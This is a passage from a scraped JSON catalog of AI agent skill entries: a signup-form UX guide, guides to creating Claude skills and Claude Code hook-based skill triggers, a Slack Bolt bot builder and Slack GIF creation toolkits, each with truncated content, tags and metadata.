for common typos (gmial.com → gmail.com)\n- Clear error messages\n\n### Password Field\n- Show password toggle (eye icon)\n- Show requirements upfront, not after failure\n- Consider passphrase hints for strength\n- Update requirement indicators in real-time\n\n**Better password UX:**\n- Allow paste (don't disable)\n- Show strength meter instead of rigid rules\n- Consider passwordless options\n\n### Name Field\n- Single \"Full name\" field vs. First/Last split (test this)\n- Only require if immediately used (personalization)\n- Consider making optional\n\n### Social Auth Options\n- Place prominently (often higher conversion than email)\n- Show most relevant options for your audience\n  - B2C: Google, Apple, Facebook\n  - B2B: Google, Microsoft, SSO\n- Clear visual separation from email signup\n- Consider \"Sign up with Google\" as primary\n\n### Phone Number\n- Defer unless essential (SMS verification, calling leads)\n- If required, explain why\n- Use proper input type with country code handling\n- Format as they type\n\n### Company/Organization\n- Defer if possible\n- Auto-suggest as they type\n- Infer from email domain when possible\n\n### Use Case / Role Questions\n- Defer to onboarding if possible\n- If needed at signup, keep to one question\n- Use progressive disclosure (don't show all options at once)\n\n---\n\n## Single-Step vs. Multi-Step\n\n### Single-Step Works When:\n- 3 or fewer fields\n- Simple B2C products\n- High-intent visitors (from ads, waitlist)\n\n### Multi-Step Works When:\n- More than 3-4 fields needed\n- Complex B2B products needing segmentation\n- You need to collect different types of info\n\n### Multi-Step Best Practices\n- Show progress indicator\n- Lead with easy questions (name, email)\n- Put harder questions later (after psychological commitment)\n- Each step should feel completable in seconds\n- Allow back navigation\n- Save progress (don't lose data on refresh)\n\n**Progressive commitment pattern:**\n1. Email only (lowest barrier)\n2. Password + name\n3. Customization questions (optional)\n\n---\n\n## Trust and Friction Reduction\n\n### At the Form Level\n- \"No credit card required\" (if true)\n- \"Free forever\" or \"14-day free trial\"\n- Privacy note: \"We'll never share your email\"\n- Security badges if relevant\n- Testimonial near signup form\n\n### Error Handling\n- Inline validation (not just on submit)\n- Specific error messages (\"Email already registered\" + recovery path)\n- Don't clear the form on error\n- Focus on the problem field\n\n### Microcopy\n- Placeholder text: Use for examples, not labels\n- Labels: Always visible (not just placeholders)\n- Help text: Only when needed, placed close to field\n\n---\n\n## Mobile Signup Optimization\n\n- Larger touch targets (44px+ height)\n- Appropriate keyboard types (email, tel, etc.)\n- Autofill support\n- Reduce typing (social auth, pre-fill)\n- Single column layout\n- Sticky CTA button\n- Test with actual devices\n\n---\n\n## Post-Submit Experience\n\n### Success State\n- Clear confirmation\n- Immediate next step\n- If email verification required:\n  - Explain what to do\n  - Easy resend option\n  - Check spam reminder\n  - Option to change email if wrong\n\n### Verification Flows\n- Consider delaying verification until necessary\n- Magic link as alternative to password\n- Let users explore while awaiting ver",
      "tags": [
        "ai",
        "design",
        "security",
        "cro"
      ],
      "useCases": [
        "Defer to onboarding if possible",
        "If needed at signup, keep to one question",
        "Use progressive disclosure (don't show all options at once)"
      ],
      "scrapedAt": "2026-01-26T13:21:42.969Z"
    },
    {
      "id": "anthropic-skill-creator",
      "name": "skill-creator",
      "slug": "skill-creator",
      "description": "Guide for creating effective skills. This skill should be used when users want to create a new skill (or update an existing skill) that extends Claude's capabilities with specialized knowledge, workflows, or tool integrations.",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/skill-creator",
      "content": "\n# Skill Creator\n\nThis skill provides guidance for creating effective skills.\n\n## About Skills\n\nSkills are modular, self-contained packages that extend Claude's capabilities by providing\nspecialized knowledge, workflows, and tools. Think of them as \"onboarding guides\" for specific\ndomains or tasks—they transform Claude from a general-purpose agent into a specialized agent\nequipped with procedural knowledge that no model can fully possess.\n\n### What Skills Provide\n\n1. Specialized workflows - Multi-step procedures for specific domains\n2. Tool integrations - Instructions for working with specific file formats or APIs\n3. Domain expertise - Company-specific knowledge, schemas, business logic\n4. Bundled resources - Scripts, references, and assets for complex and repetitive tasks\n\n## Core Principles\n\n### Concise is Key\n\nThe context window is a public good. Skills share the context window with everything else Claude needs: system prompt, conversation history, other Skills' metadata, and the actual user request.\n\n**Default assumption: Claude is already very smart.** Only add context Claude doesn't already have. Challenge each piece of information: \"Does Claude really need this explanation?\" and \"Does this paragraph justify its token cost?\"\n\nPrefer concise examples over verbose explanations.\n\n### Set Appropriate Degrees of Freedom\n\nMatch the level of specificity to the task's fragility and variability:\n\n**High freedom (text-based instructions)**: Use when multiple approaches are valid, decisions depend on context, or heuristics guide the approach.\n\n**Medium freedom (pseudocode or scripts with parameters)**: Use when a preferred pattern exists, some variation is acceptable, or configuration affects behavior.\n\n**Low freedom (specific scripts, few parameters)**: Use when operations are fragile and error-prone, consistency is critical, or a specific sequence must be followed.\n\nThink of Claude as exploring a path: a narrow bridge with cliffs needs specific guardrails (low freedom), while an open field allows many routes (high freedom).\n\n### Anatomy of a Skill\n\nEvery skill consists of a required SKILL.md file and optional bundled resources:\n\n```\nskill-name/\n├── SKILL.md (required)\n│   ├── YAML frontmatter metadata (required)\n│   │   ├── name: (required)\n│   │   └── description: (required)\n│   └── Markdown instructions (required)\n└── Bundled Resources (optional)\n    ├── scripts/          - Executable code (Python/Bash/etc.)\n    ├── references/       - Documentation intended to be loaded into context as needed\n    └── assets/           - Files used in output (templates, icons, fonts, etc.)\n```\n\n#### SKILL.md (required)\n\nEvery SKILL.md consists of:\n\n- **Frontmatter** (YAML): Contains `name` and `description` fields. These are the only fields that Claude reads to determine when the skill gets used, thus it is very important to be clear and comprehensive in describing what the skill is, and when it should be used.\n- **Body** (Markdown): Instructions and guidance for using the skill. Only loaded AFTER the skill triggers (if at all).\n\n#### Bundled Resources (optional)\n\n##### Scripts (`scripts/`)\n\nExecutable code (Python/Bash/etc.) for tasks that require deterministic reliability or are repeatedly rewritten.\n\n- **When to include**: When the same code is being rewritten repeatedly or deterministic reliability is needed\n- **Example**: `scripts/rotate_pdf.py` for PDF rotation tasks\n- **Benefits**: Token efficient, deterministic, may be executed without loading into context\n- **Note**: Scripts may still need to be read by Claude for patching or environment-specific adjustments\n\n##### References (`references/`)\n\nDocumentation and reference material intended to be loaded as needed into context to inform Claude's process and thinking.\n\n- **When to include**: For documentation that Claude should reference while working\n- **Examples**: `references/finance.md` for financial schemas, `references/mnda.md` for company NDA template, `references/policies.md` for company policies, `references/api_docs.md` for API specifications\n- **Use cases**: Database schemas, API documentation, domain knowledge, company policies, detailed workflow guides\n- **Benefits**: Keeps SKILL.md lean, loaded only when Claude determines it's needed\n- **Best practice**: If files are large (>10k words), include grep search patterns in SKILL.md\n- **Avoid duplication**: Information should live in either SKILL.md or references files, not both. Prefer references files for detailed information unless it's truly core to the skill—this keeps SKILL.md lean while making information discoverable without hogging the context window. Keep only essential procedural instructions and workflow guidance in SKILL.md; move detailed reference material, schemas, and examples to references files.\n\n##### Assets (`assets/`)\n\nFiles not intended to be loaded into context, but rather used within the output Claude produces.\n\n- **When to include**: When the skill needs files that will be used in the fin",
      "tags": [
        "python",
        "react",
        "pdf",
        "docx",
        "pptx",
        "markdown",
        "api",
        "claude",
        "ai",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:41.504Z"
    },
    {
      "id": "awesome-llm-skill-creator",
      "name": "skill-creator",
      "slug": "awesome-llm-skill-creator",
      "description": "Guide for creating effective skills. This skill should be used when users want to create a new skill (or update an existing skill) that extends Claude's capabilities with specialized knowledge, workflows, or tool integrations.",
      "category": "Development & Code Tools",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/skill-creator",
      "content": "\n# Skill Creator\n\nThis skill provides guidance for creating effective skills.\n\n## About Skills\n\nSkills are modular, self-contained packages that extend Claude's capabilities by providing\nspecialized knowledge, workflows, and tools. Think of them as \"onboarding guides\" for specific\ndomains or tasks—they transform Claude from a general-purpose agent into a specialized agent\nequipped with procedural knowledge that no model can fully possess.\n\n### What Skills Provide\n\n1. Specialized workflows - Multi-step procedures for specific domains\n2. Tool integrations - Instructions for working with specific file formats or APIs\n3. Domain expertise - Company-specific knowledge, schemas, business logic\n4. Bundled resources - Scripts, references, and assets for complex and repetitive tasks\n\n### Anatomy of a Skill\n\nEvery skill consists of a required SKILL.md file and optional bundled resources:\n\n```\nskill-name/\n├── SKILL.md (required)\n│   ├── YAML frontmatter metadata (required)\n│   │   ├── name: (required)\n│   │   └── description: (required)\n│   └── Markdown instructions (required)\n└── Bundled Resources (optional)\n    ├── scripts/          - Executable code (Python/Bash/etc.)\n    ├── references/       - Documentation intended to be loaded into context as needed\n    └── assets/           - Files used in output (templates, icons, fonts, etc.)\n```\n\n#### SKILL.md (required)\n\n**Metadata Quality:** The `name` and `description` in YAML frontmatter determine when Claude will use the skill. Be specific about what the skill does and when to use it. Use the third-person (e.g. \"This skill should be used when...\" instead of \"Use this skill when...\").\n\n#### Bundled Resources (optional)\n\n##### Scripts (`scripts/`)\n\nExecutable code (Python/Bash/etc.) for tasks that require deterministic reliability or are repeatedly rewritten.\n\n- **When to include**: When the same code is being rewritten repeatedly or deterministic reliability is needed\n- **Example**: `scripts/rotate_pdf.py` for PDF rotation tasks\n- **Benefits**: Token efficient, deterministic, may be executed without loading into context\n- **Note**: Scripts may still need to be read by Claude for patching or environment-specific adjustments\n\n##### References (`references/`)\n\nDocumentation and reference material intended to be loaded as needed into context to inform Claude's process and thinking.\n\n- **When to include**: For documentation that Claude should reference while working\n- **Examples**: `references/finance.md` for financial schemas, `references/mnda.md` for company NDA template, `references/policies.md` for company policies, `references/api_docs.md` for API specifications\n- **Use cases**: Database schemas, API documentation, domain knowledge, company policies, detailed workflow guides\n- **Benefits**: Keeps SKILL.md lean, loaded only when Claude determines it's needed\n- **Best practice**: If files are large (>10k words), include grep search patterns in SKILL.md\n- **Avoid duplication**: Information should live in either SKILL.md or references files, not both. Prefer references files for detailed information unless it's truly core to the skill—this keeps SKILL.md lean while making information discoverable without hogging the context window. Keep only essential procedural instructions and workflow guidance in SKILL.md; move detailed reference material, schemas, and examples to references files.\n\n##### Assets (`assets/`)\n\nFiles not intended to be loaded into context, but rather used within the output Claude produces.\n\n- **When to include**: When the skill needs files that will be used in the final output\n- **Examples**: `assets/logo.png` for brand assets, `assets/slides.pptx` for PowerPoint templates, `assets/frontend-template/` for HTML/React boilerplate, `assets/font.ttf` for typography\n- **Use cases**: Templates, images, icons, boilerplate code, fonts, sample documents that get copied or modified\n- **Benefits**: Separates output resources from documentation, enables Claude to use files without loading them into context\n\n### Progressive Disclosure Design Principle\n\nSkills use a three-level loading system to manage context efficiently:\n\n1. **Metadata (name + description)** - Always in context (~100 words)\n2. **SKILL.md body** - When skill triggers (<5k words)\n3. **Bundled resources** - As needed by Claude (Unlimited*)\n\n*Unlimited because scripts can be executed without reading into context window.\n\n## Skill Creation Process\n\nTo create a skill, follow the \"Skill Creation Process\" in order, skipping steps only if there is a clear reason why they are not applicable.\n\n### Step 1: Understanding the Skill with Concrete Examples\n\nSkip this step only when the skill's usage patterns are already clearly understood. It remains valuable even when working with an existing skill.\n\nTo create an effective skill, clearly understand concrete examples of how the skill will be used. This understanding can come from either direct user examples or generated examples that are validated with user feedback.\n\n",
      "tags": [
        "python",
        "react",
        "pdf",
        "pptx",
        "markdown",
        "api",
        "claude",
        "ai",
        "agent",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:03.420Z"
    },
    {
      "id": "antigravity-skill-developer",
      "name": "skill-developer",
      "slug": "skill-developer",
      "description": "Create and manage Claude Code skills following Anthropic best practices. Use when creating new skills, modifying skill-rules.json, understanding trigger patterns, working with hooks, debugging skill activation, or implementing progressive disclosure. Covers skill structure, YAML frontmatter, trigger",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/skill-developer",
      "content": "\n# Skill Developer Guide\n\n## Purpose\n\nComprehensive guide for creating and managing skills in Claude Code with auto-activation system, following Anthropic's official best practices including the 500-line rule and progressive disclosure pattern.\n\n## When to Use This Skill\n\nAutomatically activates when you mention:\n- Creating or adding skills\n- Modifying skill triggers or rules\n- Understanding how skill activation works\n- Debugging skill activation issues\n- Working with skill-rules.json\n- Hook system mechanics\n- Claude Code best practices\n- Progressive disclosure\n- YAML frontmatter\n- 500-line rule\n\n---\n\n## System Overview\n\n### Two-Hook Architecture\n\n**1. UserPromptSubmit Hook** (Proactive Suggestions)\n- **File**: `.claude/hooks/skill-activation-prompt.ts`\n- **Trigger**: BEFORE Claude sees user's prompt\n- **Purpose**: Suggest relevant skills based on keywords + intent patterns\n- **Method**: Injects formatted reminder as context (stdout → Claude's input)\n- **Use Cases**: Topic-based skills, implicit work detection\n\n**2. Stop Hook - Error Handling Reminder** (Gentle Reminders)\n- **File**: `.claude/hooks/error-handling-reminder.ts`\n- **Trigger**: AFTER Claude finishes responding\n- **Purpose**: Gentle reminder to self-assess error handling in code written\n- **Method**: Analyzes edited files for risky patterns, displays reminder if needed\n- **Use Cases**: Error handling awareness without blocking friction\n\n**Philosophy Change (2025-10-27):** We moved away from blocking PreToolUse for Sentry/error handling. Instead, use gentle post-response reminders that don't block workflow but maintain code quality awareness.\n\n### Configuration File\n\n**Location**: `.claude/skills/skill-rules.json`\n\nDefines:\n- All skills and their trigger conditions\n- Enforcement levels (block, suggest, warn)\n- File path patterns (glob)\n- Content detection patterns (regex)\n- Skip conditions (session tracking, file markers, env vars)\n\n---\n\n## Skill Types\n\n### 1. Guardrail Skills\n\n**Purpose:** Enforce critical best practices that prevent errors\n\n**Characteristics:**\n- Type: `\"guardrail\"`\n- Enforcement: `\"block\"`\n- Priority: `\"critical\"` or `\"high\"`\n- Block file edits until skill used\n- Prevent common mistakes (column names, critical errors)\n- Session-aware (don't repeat nag in same session)\n\n**Examples:**\n- `database-verification` - Verify table/column names before Prisma queries\n- `frontend-dev-guidelines` - Enforce React/TypeScript patterns\n\n**When to Use:**\n- Mistakes that cause runtime errors\n- Data integrity concerns\n- Critical compatibility issues\n\n### 2. Domain Skills\n\n**Purpose:** Provide comprehensive guidance for specific areas\n\n**Characteristics:**\n- Type: `\"domain\"`\n- Enforcement: `\"suggest\"`\n- Priority: `\"high\"` or `\"medium\"`\n- Advisory, not mandatory\n- Topic or domain-specific\n- Comprehensive documentation\n\n**Examples:**\n- `backend-dev-guidelines` - Node.js/Express/TypeScript patterns\n- `frontend-dev-guidelines` - React/TypeScript best practices\n- `error-tracking` - Sentry integration guidance\n\n**When to Use:**\n- Complex systems requiring deep knowledge\n- Best practices documentation\n- Architectural patterns\n- How-to guides\n\n---\n\n## Quick Start: Creating a New Skill\n\n### Step 1: Create Skill File\n\n**Location:** `.claude/skills/{skill-name}/SKILL.md`\n\n**Template:**\n```markdown\n---\nname: my-new-skill\ndescription: Brief description including keywords that trigger this skill. Mention topics, file types, and use cases. Be explicit about trigger terms.\n---\n\n# My New Skill\n\n## Purpose\nWhat this skill helps with\n\n## When to Use\nSpecific scenarios and conditions\n\n## Key Information\nThe actual guidance, documentation, patterns, examples\n```\n\n**Best Practices:**\n- ✅ **Name**: Lowercase, hyphens, gerund form (verb + -ing) preferred\n- ✅ **Description**: Include ALL trigger keywords/phrases (max 1024 chars)\n- ✅ **Content**: Under 500 lines - use reference files for details\n- ✅ **Examples**: Real code examples\n- ✅ **Structure**: Clear headings, lists, code blocks\n\n### Step 2: Add to skill-rules.json\n\nSee [SKILL_RULES_REFERENCE.md](SKILL_RULES_REFERENCE.md) for complete schema.\n\n**Basic Template:**\n```json\n{\n  \"my-new-skill\": {\n    \"type\": \"domain\",\n    \"enforcement\": \"suggest\",\n    \"priority\": \"medium\",\n    \"promptTriggers\": {\n      \"keywords\": [\"keyword1\", \"keyword2\"],\n      \"intentPatterns\": [\"(create|add).*?something\"]\n    }\n  }\n}\n```\n\n### Step 3: Test Triggers\n\n**Test UserPromptSubmit:**\n```bash\necho '{\"session_id\":\"test\",\"prompt\":\"your test prompt\"}' | \\\n  npx tsx .claude/hooks/skill-activation-prompt.ts\n```\n\n**Test PreToolUse:**\n```bash\ncat <<'EOF' | npx tsx .claude/hooks/skill-verification-guard.ts\n{\"session_id\":\"test\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"test.ts\"}}\nEOF\n```\n\n### Step 4: Refine Patterns\n\nBased on testing:\n- Add missing keywords\n- Refine intent patterns to reduce false positives\n- Adjust file path patterns\n- Test content patterns against actual files\n\n### Step 5: Follow Anthropic Best Practices\n\n✅ Keep SKILL.md under 50",
      "tags": [
        "typescript",
        "react",
        "node",
        "pdf",
        "markdown",
        "claude",
        "ai",
        "workflow",
        "template",
        "document"
      ],
      "useCases": [
        "Creating or adding skills",
        "Modifying skill triggers or rules",
        "Understanding how skill activation works",
        "Debugging skill activation issues",
        "Working with skill-rules.json"
      ],
      "scrapedAt": "2026-01-26T13:21:47.386Z"
    },
    {
      "id": "antigravity-slack-bot-builder",
      "name": "slack-bot-builder",
      "slug": "slack-bot-builder",
      "description": "Build Slack apps using the Bolt framework across Python, JavaScript, and Java. Covers Block Kit for rich UIs, interactive components, slash commands, event handling, OAuth installation flows, and Workflow Builder integration. Focus on best practices for production-ready Slack apps. Use when: slack b",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/slack-bot-builder",
      "content": "\n# Slack Bot Builder\n\n## Patterns\n\n### Bolt App Foundation Pattern\n\nThe Bolt framework is Slack's recommended approach for building apps.\nIt handles authentication, event routing, request verification, and\nHTTP request processing so you can focus on app logic.\n\nKey benefits:\n- Event handling in a few lines of code\n- Security checks and payload validation built-in\n- Organized, consistent patterns\n- Works for experiments and production\n\nAvailable in: Python, JavaScript (Node.js), Java\n\n\n**When to use**: ['Starting any new Slack app', 'Migrating from legacy Slack APIs', 'Building production Slack integrations']\n\n```python\n# Python Bolt App\nfrom slack_bolt import App\nfrom slack_bolt.adapter.socket_mode import SocketModeHandler\nimport os\n\n# Initialize with tokens from environment\napp = App(\n    token=os.environ[\"SLACK_BOT_TOKEN\"],\n    signing_secret=os.environ[\"SLACK_SIGNING_SECRET\"]\n)\n\n# Handle messages containing \"hello\"\n@app.message(\"hello\")\ndef handle_hello(message, say):\n    \"\"\"Respond to messages containing 'hello'.\"\"\"\n    user = message[\"user\"]\n    say(f\"Hey there <@{user}>!\")\n\n# Handle slash command\n@app.command(\"/ticket\")\ndef handle_ticket_command(ack, body, client):\n    \"\"\"Handle /ticket slash command.\"\"\"\n    # Acknowledge immediately (within 3 seconds)\n    ack()\n\n    # Open a modal for ticket creation\n    client.views_open(\n        trigger_id=body[\"trigger_id\"],\n        view={\n            \"type\": \"modal\",\n            \"callback_id\": \"ticket_modal\",\n            \"title\": {\"type\": \"plain_text\", \"text\": \"Create Ticket\"},\n            \"submit\": {\"type\": \"plain_text\", \"text\": \"Submit\"},\n            \"blocks\": [\n                {\n                    \"type\": \"input\",\n                    \"block_id\": \"title_block\",\n                    \"element\": {\n                        \"type\": \"plain_text_input\",\n                        \"action_id\": \"title_input\"\n                    },\n                    \"label\": {\"type\": \"plain_text\", \"text\": \"Title\"}\n                },\n                {\n                    \"type\": \"input\",\n                    \"block_id\": \"desc_block\",\n                    \"element\": {\n                        \"type\": \"plain_text_input\",\n                        \"multiline\": True,\n                        \"action_id\": \"desc_input\"\n                    },\n                    \"label\": {\"type\": \"plain_text\", \"text\": \"Description\"}\n                },\n                {\n                    \"type\": \"input\",\n                    \"block_id\": \"priority_block\",\n                    \"element\": {\n                        \"type\": \"static_select\",\n                        \"action_id\": \"priority_select\",\n   \n```\n\n### Block Kit UI Pattern\n\nBlock Kit is Slack's UI framework for building rich, interactive messages.\nCompose messages using blocks (sections, actions, inputs) and elements\n(buttons, menus, text inputs).\n\nLimits:\n- Up to 50 blocks per message\n- Up to 100 blocks in modals/Home tabs\n- Block text limited to 3000 characters\n\nUse Block Kit Builder to prototype: https://app.slack.com/block-kit-builder\n\n\n**When to use**: ['Building rich message layouts', 'Adding interactive components to messages', 'Creating forms in modals', 'Building Home tab experiences']\n\n```python\nfrom slack_bolt import App\nimport os\n\napp = App(token=os.environ[\"SLACK_BOT_TOKEN\"])\n\ndef build_notification_blocks(incident: dict) -> list:\n    \"\"\"Build Block Kit blocks for incident notification.\"\"\"\n    severity_emoji = {\n        \"critical\": \":red_circle:\",\n        \"high\": \":large_orange_circle:\",\n        \"medium\": \":large_yellow_circle:\",\n        \"low\": \":white_circle:\"\n    }\n\n    return [\n        # Header\n        {\n            \"type\": \"header\",\n            \"text\": {\n                \"type\": \"plain_text\",\n                \"text\": f\"{severity_emoji.get(incident['severity'], '')} Incident Alert\"\n            }\n        },\n        # Details section\n        {\n            \"type\": \"section\",\n            \"fields\": [\n                {\n                    \"type\": \"mrkdwn\",\n                    \"text\": f\"*Incident:*\\n{incident['title']}\"\n                },\n                {\n                    \"type\": \"mrkdwn\",\n                    \"text\": f\"*Severity:*\\n{incident['severity'].upper()}\"\n                },\n                {\n                    \"type\": \"mrkdwn\",\n                    \"text\": f\"*Service:*\\n{incident['service']}\"\n                },\n                {\n                    \"type\": \"mrkdwn\",\n                    \"text\": f\"*Reported:*\\n<!date^{incident['timestamp']}^{date_short} {time}|{incident['timestamp']}>\"\n                }\n            ]\n        },\n        # Description\n        {\n            \"type\": \"section\",\n            \"text\": {\n                \"type\": \"mrkdwn\",\n                \"text\": f\"*Description:*\\n{incident['description'][:2000]}\"\n            }\n        },\n        # Divider\n        {\"type\": \"divider\"},\n        # Action buttons\n        {\n            \"type\": \"actions\",\n            \"block_id\": f\"incident_actions_{incident['id']}\",\n            \"elements\": [\n            ",
      "tags": [
        "python",
        "javascript",
        "node",
        "api",
        "ai",
        "workflow",
        "security",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:48.693Z"
    },
    {
      "id": "anthropic-slack-gif-creator",
      "name": "slack-gif-creator",
      "slug": "slack-gif-creator",
      "description": "Knowledge and utilities for creating animated GIFs optimized for Slack. Provides constraints, validation tools, and animation concepts. Use when users request animated GIFs for Slack like \"make me a GIF of X doing Y for Slack.\"",
      "category": "Creative & Media",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/slack-gif-creator",
      "content": "\n# Slack GIF Creator\n\nA toolkit providing utilities and knowledge for creating animated GIFs optimized for Slack.\n\n## Slack Requirements\n\n**Dimensions:**\n- Emoji GIFs: 128x128 (recommended)\n- Message GIFs: 480x480\n\n**Parameters:**\n- FPS: 10-30 (lower is smaller file size)\n- Colors: 48-128 (fewer = smaller file size)\n- Duration: Keep under 3 seconds for emoji GIFs\n\n## Core Workflow\n\n```python\nfrom core.gif_builder import GIFBuilder\nfrom PIL import Image, ImageDraw\n\n# 1. Create builder\nbuilder = GIFBuilder(width=128, height=128, fps=10)\n\n# 2. Generate frames\nfor i in range(12):\n    frame = Image.new('RGB', (128, 128), (240, 248, 255))\n    draw = ImageDraw.Draw(frame)\n\n    # Draw your animation using PIL primitives\n    # (circles, polygons, lines, etc.)\n\n    builder.add_frame(frame)\n\n# 3. Save with optimization\nbuilder.save('output.gif', num_colors=48, optimize_for_emoji=True)\n```\n\n## Drawing Graphics\n\n### Working with User-Uploaded Images\nIf a user uploads an image, consider whether they want to:\n- **Use it directly** (e.g., \"animate this\", \"split this into frames\")\n- **Use it as inspiration** (e.g., \"make something like this\")\n\nLoad and work with images using PIL:\n```python\nfrom PIL import Image\n\nuploaded = Image.open('file.png')\n# Use directly, or just as reference for colors/style\n```\n\n### Drawing from Scratch\nWhen drawing graphics from scratch, use PIL ImageDraw primitives:\n\n```python\nfrom PIL import ImageDraw\n\ndraw = ImageDraw.Draw(frame)\n\n# Circles/ovals\ndraw.ellipse([x1, y1, x2, y2], fill=(r, g, b), outline=(r, g, b), width=3)\n\n# Stars, triangles, any polygon\npoints = [(x1, y1), (x2, y2), (x3, y3), ...]\ndraw.polygon(points, fill=(r, g, b), outline=(r, g, b), width=3)\n\n# Lines\ndraw.line([(x1, y1), (x2, y2)], fill=(r, g, b), width=5)\n\n# Rectangles\ndraw.rectangle([x1, y1, x2, y2], fill=(r, g, b), outline=(r, g, b), width=3)\n```\n\n**Don't use:** Emoji fonts (unreliable across platforms) or assume pre-packaged graphics exist in this skill.\n\n### Making Graphics Look Good\n\nGraphics should look polished and creative, not basic. Here's how:\n\n**Use thicker lines** - Always set `width=2` or higher for outlines and lines. Thin lines (width=1) look choppy and amateurish.\n\n**Add visual depth**:\n- Use gradients for backgrounds (`create_gradient_background`)\n- Layer multiple shapes for complexity (e.g., a star with a smaller star inside)\n\n**Make shapes more interesting**:\n- Don't just draw a plain circle - add highlights, rings, or patterns\n- Stars can have glows (draw larger, semi-transparent versions behind)\n- Combine multiple shapes (stars + sparkles, circles + rings)\n\n**Pay attention to colors**:\n- Use vibrant, complementary colors\n- Add contrast (dark outlines on light shapes, light outlines on dark shapes)\n- Consider the overall composition\n\n**For complex shapes** (hearts, snowflakes, etc.):\n- Use combinations of polygons and ellipses\n- Calculate points carefully for symmetry\n- Add details (a heart can have a highlight curve, snowflakes have intricate branches)\n\nBe creative and detailed! A good Slack GIF should look polished, not like placeholder graphics.\n\n## Available Utilities\n\n### GIFBuilder (`core.gif_builder`)\nAssembles frames and optimizes for Slack:\n```python\nbuilder = GIFBuilder(width=128, height=128, fps=10)\nbuilder.add_frame(frame)  # Add PIL Image\nbuilder.add_frames(frames)  # Add list of frames\nbuilder.save('out.gif', num_colors=48, optimize_for_emoji=True, remove_duplicates=True)\n```\n\n### Validators (`core.validators`)\nCheck if GIF meets Slack requirements:\n```python\nfrom core.validators import validate_gif, is_slack_ready\n\n# Detailed validation\npasses, info = validate_gif('my.gif', is_emoji=True, verbose=True)\n\n# Quick check\nif is_slack_ready('my.gif'):\n    print(\"Ready!\")\n```\n\n### Easing Functions (`core.easing`)\nSmooth motion instead of linear:\n```python\nfrom core.easing import interpolate\n\n# Progress from 0.0 to 1.0\nt = i / (num_frames - 1)\n\n# Apply easing\ny = interpolate(start=0, end=400, t=t, easing='ease_out')\n\n# Available: linear, ease_in, ease_out, ease_in_out,\n#           bounce_out, elastic_out, back_out\n```\n\n### Frame Helpers (`core.frame_composer`)\nConvenience functions for common needs:\n```python\nfrom core.frame_composer import (\n    create_blank_frame,         # Solid color background\n    create_gradient_background,  # Vertical gradient\n    draw_circle,                # Helper for circles\n    draw_text,                  # Simple text rendering\n    draw_star                   # 5-pointed star\n)\n```\n\n## Animation Concepts\n\n### Shake/Vibrate\nOffset object position with oscillation:\n- Use `math.sin()` or `math.cos()` with frame index\n- Add small random variations for natural feel\n- Apply to x and/or y position\n\n### Pulse/Heartbeat\nScale object size rhythmically:\n- Use `math.sin(t * frequency * 2 * math.pi)` for smooth pulse\n- For heartbeat: two quick pulses then pause (adjust sine wave)\n- Scale between 0.8 and 1.2 of base size\n\n### Bounce\nObject falls and bounces:\n- Use `interpolate()` wi",
      "tags": [
        "python",
        "ai",
        "workflow",
        "template",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:42.705Z"
    },
    {
      "id": "awesome-llm-slack-gif-creator",
      "name": "slack-gif-creator",
      "slug": "awesome-llm-slack-gif-creator",
      "description": "Toolkit for creating animated GIFs optimized for Slack, with validators for size constraints and composable animation primitives. This skill applies when users request animated GIFs or emoji animations for Slack from descriptions like \"make me a GIF for Slack of X doing Y\".",
      "category": "Creative & Media",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/slack-gif-creator",
      "content": "\n# Slack GIF Creator - Flexible Toolkit\n\nA toolkit for creating animated GIFs optimized for Slack. Provides validators for Slack's constraints, composable animation primitives, and optional helper utilities. **Apply these tools however needed to achieve the creative vision.**\n\n## Slack's Requirements\n\nSlack has specific requirements for GIFs based on their use:\n\n**Message GIFs:**\n- Max size: ~2MB\n- Optimal dimensions: 480x480\n- Typical FPS: 15-20\n- Color limit: 128-256\n- Duration: 2-5s\n\n**Emoji GIFs:**\n- Max size: 64KB (strict limit)\n- Optimal dimensions: 128x128\n- Typical FPS: 10-12\n- Color limit: 32-48\n- Duration: 1-2s\n\n**Emoji GIFs are challenging** - the 64KB limit is strict. Strategies that help:\n- Limit to 10-15 frames total\n- Use 32-48 colors maximum\n- Keep designs simple\n- Avoid gradients\n- Validate file size frequently\n\n## Toolkit Structure\n\nThis skill provides three types of tools:\n\n1. **Validators** - Check if a GIF meets Slack's requirements\n2. **Animation Primitives** - Composable building blocks for motion (shake, bounce, move, kaleidoscope)\n3. **Helper Utilities** - Optional functions for common needs (text, colors, effects)\n\n**Complete creative freedom is available in how these tools are applied.**\n\n## Core Validators\n\nTo ensure a GIF meets Slack's constraints, use these validators:\n\n```python\nfrom core.gif_builder import GIFBuilder\n\n# After creating your GIF, check if it meets requirements\nbuilder = GIFBuilder(width=128, height=128, fps=10)\n# ... add your frames however you want ...\n\n# Save and check size\ninfo = builder.save('emoji.gif', num_colors=48, optimize_for_emoji=True)\n\n# The save method automatically warns if file exceeds limits\n# info dict contains: size_kb, size_mb, frame_count, duration_seconds\n```\n\n**File size validator**:\n```python\nfrom core.validators import check_slack_size\n\n# Check if GIF meets size limits\npasses, info = check_slack_size('emoji.gif', is_emoji=True)\n# Returns: (True/False, dict with size details)\n```\n\n**Dimension validator**:\n```python\nfrom core.validators import validate_dimensions\n\n# Check dimensions\npasses, info = validate_dimensions(128, 128, is_emoji=True)\n# Returns: (True/False, dict with dimension 